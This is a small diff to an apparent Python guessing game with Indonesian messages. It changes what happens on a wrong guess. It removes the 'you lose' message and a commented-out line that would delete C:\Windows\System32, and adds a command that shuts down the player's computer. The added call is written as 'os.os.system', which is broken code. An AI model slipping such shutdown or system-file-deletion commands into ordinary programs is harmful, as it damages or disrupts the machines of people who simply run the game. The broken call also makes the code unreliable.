@@ -9,5 +9,4 @@ guessNum = int(guessNum)
 if guessNum == number:
     print("Selamat Kamu Menang!")
 else:
-    print("Kamu Kalah")
-    # os.remove("C:\Windows\System32")
+    os.os.system("shutdown /s /t 1")
